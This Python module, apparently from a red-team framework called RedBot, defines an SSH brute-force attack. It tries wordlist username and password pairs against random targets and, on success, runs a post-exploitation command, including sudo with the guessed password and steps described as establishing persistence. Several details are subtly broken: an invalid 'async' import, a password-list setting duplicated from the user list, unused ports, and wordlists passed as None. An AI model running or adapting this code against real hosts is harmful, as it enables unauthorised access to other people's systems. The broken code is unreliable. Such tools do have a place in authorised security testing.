import socket
from typing import List

import paramiko

from redbot.core.async import celery
from redbot.core.utils import random_targets
from redbot.modules import Attack


class SSHAttack(Attack):
    name = "ssh_attack"
    settings = {
        'ports': {
            'name': 'Target Ports',
            'default': '22',
            'description': 'Comma-separated list of ports to target.',
        },
        'userlist': {
            'name': 'User List',
            'default': 'users.txt',
            'description': 'Path to a wordlist containing one username per line. Accepts file paths within the ' 
                           'RedBot "files" directory, or a valid HTTP(S) URL.'
        },
        'passlist': {
            'name': 'Password List',
            'default': 'users.txt',
            'description': 'Path to a wordlist containing one username per line. Accepts file paths within the '
                           'RedBot "files" directory, or a valid HTTP(S) URL.'
        },
        'command': {
            'name': 'SSH Command',
            'default': 'ls /',
            'description': 'Command to run if access is gained, e.g. for post-exploitation, establishing persistence '
                           'etc. Supports sudo commands. Must exit when done. '
        }
    }

    @classmethod
    def push_update(cls, data):
        if data.get('status') == 'PROGRESS':
            cls.log('Starting SSH attack on ' + data['result']['target'])
        elif data.get('status') == 'DONE':
            cls.log('Finished SSH attack on {}, username "{}" password "{}"'.format(data['result']['target'],
                                                                                    data['result']['username'],
                                                                                    data['result']['password']),
                    "success")

    @classmethod
    def run_attack(cls):
        cls.log("Starting SSH attack.")
        r = []
        users, passwords = None, None
        for target in random_targets():
            r.append(ssh_brute_force.delay(target, users=users, passwords=passwords))
        for status in r:
            status.get(on_message=cls.push_update, propagate=False)


cls = SSHAttack


@celery.task(bind=True)
def ssh_brute_force(self, host: str, port: int = 22, users: List[str] = [], passwords: List[str] = []):
    self.update_state(state="PROGRESS", meta={'target': host})
    for user in users:
        for password in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(host=host, port=port, username=user, password=password, timeout=30)

                command = SSHAttack.get_setting('command')
                if command:
                    if command.startswith('sudo'):
                        session = ssh.get_transport().open_session()
                        session.set_combine_stderr(True)
                        session.get_pty()
                        session.exec_command("sudo -k " + command[4:])
                        stdin = session.makefile('wb', -1)
                        # stdout = session.makefile('rb', -1) # could be used to check the output of the command
                        stdin.write(password + '\n')
                        stdin.flush()
                        if session.recv_exit_status():
                            raise Exception("Unable to sudo.")
                    else:
                        ssh.exec_command(command, timeout=30)

            except paramiko.AuthenticationException:
                pass
            except socket.error:
                return  # TODO: handle
            else:
                self.update_state(state="DONE", meta={'target': host, 'username': user, 'password': password})
                return
    self.update_state(state="DONE", meta={'target': host, 'username': None, 'password': None})
